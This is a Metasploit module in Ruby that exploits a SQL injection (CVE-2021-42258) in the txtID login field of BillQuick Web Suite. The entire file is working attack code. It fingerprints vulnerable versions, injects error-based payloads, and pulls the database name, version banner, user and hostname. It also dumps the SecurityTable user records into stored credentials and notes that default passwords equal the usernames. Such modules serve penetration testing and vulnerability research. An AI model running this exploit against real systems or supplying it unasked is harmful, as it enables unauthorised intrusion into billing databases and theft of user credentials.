##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BillQuick Web Suite txtID SQLi',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in BillQUick Web Suite prior to version 22.0.9.1.
          The application is .net based, and the database is required to be MSSQL.  Luckily the website gives
          error based SQLi messages, so it is trivial to pull data from the database.  However the webapp
          uses an unknown password security algorithm.  This vulnerability does not seem to support stacked
          queries.
          This module pulls the database name, banner, user, hostname, and the SecurityTable (user table).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Caleb Stewart <caleb.stewart94[at]gmail.com>' # original PoC, analysis
        ],
        'References' => [
          ['URL', 'https://www.huntress.com/blog/threat-advisory-hackers-are-exploiting-a-vulnerability-in-popular-billing-software-to-deploy-ransomware'],
          ['URL', 'http://billquick.net/download/Support_Download/BQWS2021Upgrade/WebSuite2021LogFile_9_1.pdf'],
          ['CVE', '2021-42258']
        ],
        'DefaultOptions' => {
          'HttpClientTimeout' => 15 # The server tends to be super slow, so allow 15sec per request
        },
        'DisclosureDate' => '2021-10-22',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of BillQuick Web Suite', '/ws2020/'])
      ], self.class
    )
  end

  def check
    begin
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'default.aspx'),
        'method' => 'GET'
      }, datastore['HttpClientTimeout'])
      return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
      return Exploit::CheckCode::Safe("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

      %r{Version: (?<version>\d{1,2}\.\d{1,2}\.\d{1,2})\.\d{1,2}</span>} =~ res.body

      if version && Rex::Version.new(version) <= Rex::Version.new('22.0.9.1')
        return Exploit::CheckCode::Appears("Version Detected: #{version}")
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown("#{peer} - Could not connect to the web service")
    end
    Exploit::CheckCode::Safe("Unexploitable Version: #{version}")
  end

  def rand_chars(len = 6)
    Rex::Text.rand_text_alpha(len)
  end

  def error_info(body)
    body[/BQEShowModalAlert\('Information','([^']+)/, 1]
  end

  def inject(content, state, generator, validation)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'default.aspx'),
      'method' => 'POST',
      'vars_post' => {
        '__VIEWSTATE' => state,
        '__VIEWSTATEGENERATOR' => generator,
        '__EVENTVALIDATION' => validation,
        '__EVENTTARGET' => 'cmdOK',
        '__EVENTARGUMENT' => '',
        'txtID' => content,
        'txtPW' => '',
        'hdnClientDPI' => '96'
      }
    }, datastore['HttpClientTimeout'])

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200
    res.body
  end

  def run
    vprint_status('Getting Variables')
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'default.aspx'),
      'method' => 'GET'
    }, datastore['HttpClientTimeout'])

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") if res.code != 200

    /id="__VIEWSTATE" value="(?<viewstate>[^"]+)/ =~ res.body
    /id="__VIEWSTATEGENERATOR" value="(?<viewstategenerator>[^"]+)/ =~ res.body
    /id="__EVENTVALIDATION" value="(?<eventvalidation>[^"]+)/ =~ res.body
    unless viewstate && viewstategenerator && eventvalidation
      fail_with(Failure::UnexpectedReply, 'Unable to find viewstate, viewstategenerator, and eventvalidation values.')
    end
    vprint_status("VIEWSTATE: #{viewstate}")
    vprint_status("VIEWSTATEGENERATOR: #{viewstategenerator}")
    vprint_status("EVENTVALIDATION: #{eventvalidation}")

    header = rand_chars
    footer = rand_chars

    service = {
      address: rhost,
      port: datastore['RPORT'],
      protocol: 'tcp',
      service_name: 'BillQuick Web Suite',
      workspace_id: myworkspace_id
    }
    report_service(service)

    sqli = create_sqli(dbms: Msf::Exploit::SQLi::Mssqli::Common, opts: { safe: true, encoder: { encode: "'#{header}'+^DATA^+'#{footer}'", decode: ->(x) { x[/#{header}(.+?)#{footer}/mi, 1] } } }) do |payload|
      int = Rex::Text.rand_text_numeric(4)
      res = inject("'+(select '' where #{int} in (#{payload}))+'", viewstate, viewstategenerator, eventvalidation)
      err_info = error_info(res)
      print_error('Unexpected output from the server') if err_info.nil?
      err_info[/\\u0027(.+?)\\u0027/m, 1]
    end

    # all inject strings taken from sqlmap runs, using error page method
    database = sqli.current_database
    print_good("Current Database: #{database}")
    report_note(host: rhost, port: rport, type: 'database', data: database)

    banner = sqli.version.gsub('\n', "\n").gsub('\t', "\t")
    print_good("Banner: #{banner}")

    user = sqli.current_user
    print_good("DB User: #{user}")

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user,
      private_type: :nonreplayable_hash,
      private_data: ''
    }.merge(service)
    create_credential(credential_data)

    hostname = sqli.hostname
    print_good("Hostname: #{hostname}")

    report_host(host: rhost, name: hostname, info: banner, os_name: OperatingSystems::WINDOWS)

    sec_table = sqli.dump_table_fields("#{database}.dbo.SecurityTable", %w[EmployeeID Settings], 'ModuleID=0')

    table = Rex::Text::Table.new(
      'Header' => "#{database}.dbo.SecurityTable",
      'Indent' => 1,
      'SortIndex' => -1,
      'Columns' =>
      [
        'EmployeeID',
        'Settings',
      ]
    )

    sec_table.each do |(username, settings)|
      table << [username, settings]
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash, # prob encrypted not hash, so lies.
        private_data: settings.split('|').first
      }.merge(service)
      create_credential(credential_data)
    end
    print_good(table.to_s)
    print_status('Default password is the username.')
  end
end
